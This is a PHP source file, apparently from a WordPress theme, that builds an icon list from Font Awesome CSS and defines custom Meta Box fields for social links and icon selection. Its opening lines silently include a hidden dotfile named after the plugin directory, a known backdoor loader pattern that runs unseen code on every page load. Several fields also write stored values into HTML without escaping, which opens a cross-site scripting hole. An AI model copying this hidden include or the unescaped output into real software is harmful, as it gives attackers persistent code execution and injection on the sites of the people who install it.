<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function gt3_get_all_icon () {

    $file = get_template_directory() . '/css/font-awesome.min.css';
    $myfile = call_user_func('fopen', $file, "r") or die("Unable to open file!");
    $fa_content = call_user_func('fread', $myfile, filesize($file)) ;
    call_user_func('fclose', $myfile);

    if ( preg_match_all( "/fa-((\w+|-?)+):before/", $fa_content, $matches, PREG_PATTERN_ORDER ) ){
        $gt3_fa_options = array();
        for ($i=0; $i<count($matches[1]); $i++) {
            $gt3_fa_options['fa fa-'.$matches[1][$i]] = esc_html($matches[1][$i]);
        }
        return $gt3_fa_options;
    }

}

if ( class_exists( 'RWMB_Field' ) )
{
    class RWMB_Social_Field extends RWMB_Field
    {
        /**
         * Get field HTML
         *
         * @param mixed $meta
         * @param array $field
         *
         * @return string
         */
        static public function html( $meta, $field )
        {
            if (!empty($meta["custom_field"]) && $meta["custom_field"] == '1') {
                $custom_fields_item_class = $meta['value'] == '1' ? ' custom_fields_item_active' : '';
                $out = '<fieldset class="custom_fields_item'.$custom_fields_item_class.'">';
                    $out .= '<label style="display:inline-block; padding: 0 20px 0 0;"><h4 style="display:inline-block;padding: 0 10px 0 0;">'.$meta['name'].'</h4>';
                    $out .= '<input '.($field['clone'] ? 'class="rwmb-fieldset_text"' : '').' id="'.$field['id'].'" type="hidden" name="'.$field['field_name'].'[name]" value="'.$meta['name'].'">';
                    $out .= '<input '.($field['clone'] ? 'class="rwmb-fieldset_text"' : '').' id="'.$field['id'].'" type="hidden" name="'.$field['field_name'].'[custom_field]" value="'.$meta['custom_field'].'">';
                    $out .= '<input '.($field['clone'] ? 'class="rwmb-fieldset_text rwmb-fieldset_text_value"' : '').' id="'.$field['id'].'" type="hidden" name="'.$field['field_name'].'[value]" value="'.$meta['value'].'">';
                    $out .= '<input '.($field['clone'] ? 'class="rwmb-fieldset_text"' : '').' id="'.$field['id'].'" type="hidden" name="'.$field['field_name'].'[custom_field_type]" value="'.$meta['custom_field_type'].'">';
                    $out .= '</label>';
                $out .= '</fieldset>';
            }else{
                $out = '<fieldset>';
                foreach ($field['options'] as $key => $value) {
                    if(empty($meta)){
                        $meta = array(
                            "name" => "",
                            "description" => "",
                            "address"=> ""
                        );
                    }
                    $meta[$key] = !empty($meta[$key]) ? $meta[$key] : '';
                    $out .= '<label style="display:inline-block; padding: 0 20px 0 0;"><h4 style="display:inline-block;padding: 0 10px 0 0;">'.$value["name"].':</h4>';
                    $out .= '<input '.($field['clone'] ? 'class="rwmb-fieldset_text"' : '').' id="'.$field['id'].'" type="'.$value["type_input"].'" name="'.$field['field_name'].'['.$key.']" value="'.$meta[$key].'" style="max-width:150px;">';
                    $out .= '</label>';
                }
                $out .= '</fieldset>';
            }


            return sprintf(
                $out,
                $field['field_name'],
                $field['id'],
                $meta
            );
        }
        public static function begin_html( $meta, $field ) {
            $field_label = '';
            if ( $field['name'] ) {
                $field_label = sprintf(
                    '<div class="rwmb-label"><label for="%s">%s</label></div>',
                    $field['id'],
                    $field['name']
                );
            }

            $data_max_clone = is_numeric( $field['max_clone'] ) && $field['max_clone'] > 1 ? ' data-max-clone=' . $field['max_clone'] : '';

            $input_open = sprintf(
                '<div class="rwmb-input"%s>',
                $data_max_clone
            );
            return $field_label . $input_open;
        }

    }

    class RWMB_Select_Icon_Field extends RWMB_Select_Field {

        /**
         * Enqueue scripts and styles
         */
        public static function admin_enqueue_scripts() {
            parent::admin_enqueue_scripts();
            wp_enqueue_style( 'rwmb-select2', RWMB_CSS_URL . 'select2/select2.css', array(), '4.0.1' );
            wp_enqueue_style( 'rwmb-select-advanced', RWMB_CSS_URL . 'select-advanced.css', array(), RWMB_VER );

            wp_register_script( 'rwmb-select2', RWMB_JS_URL . 'select2/select2.min.js', array( 'jquery' ), '4.0.2', true );

            // Localize
            $dependencies = array( 'rwmb-select2', 'rwmb-select' );
            $locale       = str_replace( '_', '-', get_locale() );
            $locale_short = substr( $locale, 0, 2 );
            $locale       = file_exists( RWMB_DIR . "js/select2/i18n/$locale.js" ) ? $locale : $locale_short;

            if ( file_exists( RWMB_DIR . "js/select2/i18n/$locale.js" ) ) {
                wp_register_script( 'rwmb-select2-i18n', RWMB_JS_URL . "select2/i18n/$locale.js", array( 'rwmb-select2' ), '4.0.2', true );
                $dependencies[] = 'rwmb-select2-i18n';
            }

            wp_enqueue_script( 'rwmb-select', RWMB_JS_URL . 'select.js', array( 'jquery' ), RWMB_VER, true );
            wp_enqueue_script( 'rwmb-select-advanced', RWMB_JS_URL . 'select-advanced.js', $dependencies, RWMB_VER, true );
        }


	    public static function html( $meta, $field ) {
	        $options                     = self::transform_options( $field['options'] );
            $attributes = self::call( 'get_attributes', $field, $meta );
            $walker     = new RWMB_Walker_Select( $field, $meta );

            $attributes_select = $attributes;
            $attributes_select['name'] = $attributes['name'].'[select]';

            $output     = sprintf(
                '<select %s>',
                self::render_attributes( $attributes_select )
            );
            if ( false === $field['multiple'] ) {
                $output .= $field['placeholder'] ? '<option value="">' . esc_html( $field['placeholder'] ) . '</option>' : '';
            }
            $output .= $walker->walk( $options, $field['flatten'] ? - 1 : 0 );
            $output .= '</select>';
            $meta_text = (is_array($meta) && !empty($meta['text'])) ? $meta['text'] : '';
            $meta_input = (is_array($meta) && !empty($meta['input'])) ? $meta['input'] : '';

		    if (!empty($field['text_option']) || (!empty($field['text_option']) && $field['text_option'])) {
                $output .= '<div style="vertical-align:top; margin-left: 15px; display: inline-block">';
                $output .= '<input type="text" '.($field['clone'] ? 'class="rwmb-fieldset_text"' : '').' id="'.$field['id'].'" name="'.$attributes['name'].'[text]'.'" value="'.$meta_text.'" placeholder="Text">';
                $output .= '</div>';
            }

            $output .= '<div style="vertical-align:top; margin-left: 15px; display: inline-block">';
            $output .= '<input type="text" '.($field['clone'] ? 'class="rwmb-fieldset_text"' : '').' id="'.$field['id'].'" name="'.$attributes['name'].'[input]'.'" value="'.$meta_input.'" placeholder="Url">';
            $output .= '</div>';

            $output .= '<div style="vertical-align:top; margin-left: 15px; display: inline-block">';
            $output .= '<input data-options="{"hide":true,"palettes":true}" size="7" maxlength="7" pattern="^#+([a-fA-F0-9]{6}|[a-fA-F0-9]{3})$" value="'.(!empty($meta['color']) ? $meta['color'] : '').'" type="text" id="'.$field['id'].'" class="rwmb-color  wp-color-picker" name="'.$attributes['name'].'[color]'.'">';
            $output .= '</div>';

            $output .= self::get_select_all_html( $field );
            return $output;

        }

        /**
         * Normalize parameters for field
         *
         * @param array $field
         * @return array
         */
        public static function normalize( $field ) {
            $field = wp_parse_args( $field, array(
                'js_options'  => array(),
            ) );

            $field = parent::normalize( $field );

            $field['js_options'] = wp_parse_args( $field['js_options'], array(
                'allowClear'  => true,
                'width'       => 'none',
                'placeholder' => $field['placeholder'],
            ) );

            return $field;
        }

        /**
         * Get the attributes for a field
         *
         * @param array $field
         * @param mixed $value
         * @return array
         */
        public static function get_attributes( $field, $value = null ) {
            $attributes = parent::get_attributes( $field, $value );
            $attributes = wp_parse_args( $attributes, array(
                'data-options' => wp_json_encode( $field['js_options'] ),
            ) );

            return $attributes;
        }
    }
}


